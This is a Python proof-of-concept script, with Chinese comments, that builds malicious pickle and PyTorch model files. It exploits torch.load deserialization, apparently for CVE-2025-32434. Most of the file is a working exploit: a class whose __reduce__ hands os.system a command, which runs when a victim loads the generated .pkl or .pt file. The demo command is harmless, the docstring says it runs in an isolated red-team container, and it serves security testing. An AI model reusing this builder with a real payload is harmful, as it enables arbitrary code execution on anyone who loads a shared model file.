#!/usr/bin/env python3
"""
CVE-2025-32434 / pickle deserialization RCE — PoC (safe, sandboxed)

核心原理 (PyTorch torch.load root cause):
  torch.load() 底层用 pickle 反序列化，从不信任的 .pt 文件加载时，
  若文件中含恶意的 __reduce__ 对象，会在反序列化时触发任意命令执行。
  本 PoC 复现该机制，使用 *无害* 命令 (创建 /tmp 下的演示文件 + 打印 id)
  仅用于证明"加载恶意模型文件 = 任意代码执行"。

安全性声明:
  - 仅在 redteam-attacker 隔离容器内运行 (python:3.12-slim, 隔离网络)
  - 命令无破坏性: touch /tmp/rce_demo + id，不影响宿主机
  - 不联网、不反弹shell、不改系统

用法:
  1. 构造恶意 .pkl/.pt 文件:  python3 poc_build_malicious.py
  2. 模拟"受害者加载":    python3 poc_victim_load.py
"""
import pickle
import os
import sys


class RCEPayload:
    """反序列化时自动执行的恶意对象 (__reduce__ 是 pickle 的钩子)。"""

    def __reduce__(self):
        # 返回 (调用目标, 参数元组) —— pickle 反序列化时会执行 os.system(...)
        # 这里只做无害演示: 创建 /tmp 标记文件 + 打印执行身份
        cmd = "touch /tmp/rce_demo && id && echo 'RCE_TRIGGERED_BY_PICKLE'"
        return (os.system, (cmd,))


def build_malicious_pickle(path: str) -> int:
    """构造恶意 pickle 文件 (.pkl 或 .pt 均可——torch.load 读 .pt 同机制)。"""
    payload = pickle.dumps(RCEPayload())
    with open(path, "wb") as f:
        f.write(payload)
    print(f"[+] 恶意文件已生成: {path} ({len(payload)} bytes)")
    return len(payload)


def main():
    # 生成到可写目录 (/attack-reports 是 rw 挂载)，也可容器内 /tmp
    out_dir = os.environ.get("POC_OUT_DIR", "/tmp")
    for ext in ("pkl", "pt"):
        out = os.path.join(out_dir, f"malicious_model.{ext}")
        build_malicious_pickle(out)
    print("\n[+] 完成构造。下一步: 用 victim 脚本加载并观察 RCE 触发。")
    print(f"[+] 文件位于: {out_dir}/malicious_model.{{pkl,pt}}")


if __name__ == "__main__":
    main()
